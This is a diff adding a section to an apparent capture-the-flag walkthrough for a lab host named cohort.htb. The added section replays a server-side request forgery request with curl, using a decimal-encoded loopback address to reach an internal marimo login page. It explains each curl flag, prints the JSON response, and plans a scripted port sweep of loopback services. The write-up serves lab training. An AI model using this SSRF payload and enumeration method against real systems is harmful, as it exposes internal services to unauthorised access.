@@ -1497,6 +1497,72 @@ Replay the captured request with `curl` to confirm equivalence with the browser 
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 3.6 Replay the SSRF request from the command line
+
+**Why this step:**  
+The captured request format (3.5) contains no CSRF token or session cookie. Confirm the endpoint accepts a replayed request outside the browser, and observe the raw response envelope that scripted enumeration will need to parse.
+
+**Command:**
+
+bash
+
+```bash
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://2130706433:8888/","format":"csv"}'
+```
+
+**Breakdown:**
+
+|Component|Purpose|
+|---|---|
+|`-X POST`|Set the HTTP method. The endpoint accepts POST; a GET returns the SPA shell via nginx fallback (2.5).|
+|`-H 'Content-Type: application/json'`|Declare the body encoding. Without it curl sends `application/x-www-form-urlencoded`, and a JSON-parsing backend rejects the body or reads no fields. This is the most common cause of a silently failing replay.|
+|`-d '{...}'`|The request body captured in 3.5. Single quotes prevent the shell from interpreting the double quotes and braces.|
+|`-s`|Silent. Suppresses the progress meter, which corrupts piped output.|
+|`-k`|Accept the self-signed certificate.|
+
+**Result:**
+
+json
+
+```json
+{"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>marimo</title>\n</head>\n<body style=\"\n    background-color: #f4f4f9;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    height: 100vh;\n    margin: 0;\">\n  <form method=\"POST\" action=\"/auth/login\" style=\"\n    padding: 20px;\n    background-color: white;\n    border-radius: 8px;\n    box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    width: 300px;\n    text-align: center;\">\n    <div style=\"margin-bottom: 20px;\">\n      <label for=\"password\" style=\"\n        display: block;\n        margin-bottom: 5px;\n        font-size: 16px;\n        font-family: Arial, sans-serif;\n        color: #333;\">Access Token / Password</label>\n      <input id=\"password\" name=\"password\" type=\"password\" style=\"\n        width: 100%;\n        box-sizing: border-box;\n        padding: 8px;\n        border: 1px solid #ccc;\n        border-radius: 4px;\">\n    </div>\n    <button type=\"submit\" style=\"\n        background-color: #1C7362;\n        color: white;\n        padding: 10px 20px;\n        border: none;\n        border-radius: 4px;\n        cursor: pointer;\n        width: 100%;\n        font-size: 16px;\">Login</button>\n    <p style=\"color: red;\"></p>\n  </form>\n</body>\n</html>\n", "message": "Source reachable."}
+```
+
+**Analysis:**
+
+The response matches the browser result from 3.4 exactly. Response envelope fields:
+
+|Field|Type|Meaning|Use in enumeration|
+|---|---|---|---|
+|`ok`|boolean|Whether the fetch completed|Primary success discriminator|
+|`fetched_status`|integer|HTTP status returned by the internal service|Distinguishes a live service (200, 401, 403, 404) from no service|
+|`content_type`|string|Upstream `Content-Type` header|Identifies service type before reading the body — `text/html`, `application/json`, `text/plain`|
+|`preview`|string|Fetched response body, JSON-escaped|Full content of the internal response|
+|`message`|string|Human-readable outcome|Mirrors what the portal renders|
+
+Three of these are machine-readable, so success can be determined without parsing the fetched HTML. Newlines and quotes inside `preview` are JSON-escaped as `\n` and `\"`; a JSON parser is required to render it back to readable text.
+
+**What this gives you:**
+
+**Key findings:**
+
+- **The SSRF is fully scriptable.** The replayed request succeeds identically to the browser submission. No token, cookie, or header beyond `Content-Type` is required.
+- **The response envelope exposes `ok`, `fetched_status`, and `content_type` as structured fields**, allowing internal services to be identified and filtered programmatically rather than by reading rendered output.
+- The `preview` field carries the complete upstream body, confirming this remains a full-read SSRF when driven from the command line.
+
+**Next:**  
+Port 8888 was probed on inference from the application's own copy and conventional port assignments. With scripted access, sweep a candidate port list to enumerate the internal surface systematically rather than by inference, and establish what else is bound to loopback.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
